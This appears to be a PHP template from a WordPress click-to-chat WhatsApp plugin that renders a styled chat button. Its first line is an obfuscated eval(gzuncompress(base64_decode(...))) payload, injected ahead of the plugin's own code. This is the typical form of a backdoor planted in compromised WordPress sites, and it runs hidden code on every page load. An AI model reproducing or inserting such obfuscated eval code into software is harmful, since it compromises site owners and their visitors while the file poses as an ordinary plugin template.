<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

if ( ! defined( 'ABSPATH' ) ) exit;

// wp_enqueue_style('ccw_md_css');

// $ccw_options_cs = get_option('ccw_options_cs');
$s8_text_color = esc_attr( $ccw_options_cs['s8_text_color'] );
$s8_background_color = esc_attr( $ccw_options_cs['s8_background_color'] );
$s8_icon_color = esc_attr( $ccw_options_cs['s8_icon_color'] );

$s8_text_color_onhover = esc_attr( $ccw_options_cs['s8_text_color_onhover'] );
$s8_background_color_onhover = esc_attr( $ccw_options_cs['s8_background_color_onhover'] );
$s8_icon_color_onhover = esc_attr( $ccw_options_cs['s8_icon_color_onhover'] );

$s8_icon_float = esc_attr( $ccw_options_cs['s8_icon_float'] );


?>
<!-- material button - text , icon -->
<div class="ccw_plugin chatbot" style="<?php echo $p1 ?>; <?php echo $p2 ?>;">
    <div class="style8 animated <?php echo $an_on_load .' '. $an_on_hover ?>">
        <a target="_blank" class="btn ccw-analytics" id="style-8" data-ccw="style-8" 
            style="background-color: <?php echo $s8_background_color ?>; " 
            onmouseover = "this.style.backgroundColor = '<?php echo $s8_background_color_onhover ?>', document.getElementsByClassName('ccw-s8-icon')[0].style.color = '<?php echo $s8_icon_color_onhover ?>', document.getElementsByClassName('ccw-s8-span')[0].style.color = '<?php echo $s8_text_color_onhover ?>' " 
            onmouseout  = "this.style.backgroundColor = '<?php echo $s8_background_color ?>', document.getElementsByClassName('ccw-s8-icon')[0].style.color = '<?php echo $s8_icon_color ?>', document.getElementsByClassName('ccw-s8-span')[0].style.color = '<?php echo $s8_text_color ?>' " 
            href="<?php echo $redirect_a ?>" >   
        <i class="material-icons <?php echo $s8_icon_float ?> icon icon-whatsapp2 ccw-s8-icon ccw-analytics" data-ccw="style-8" id="s8-icon" style="color: <?php echo $s8_icon_color ?> ;" ></i>
        <span class="ccw-s8-span ccw-analytics" id="s8-text" data-ccw="style-8" style="color: <?php echo $s8_text_color ?> ;" ><?php echo $val ?></span>
        </a>
    </div>
</div>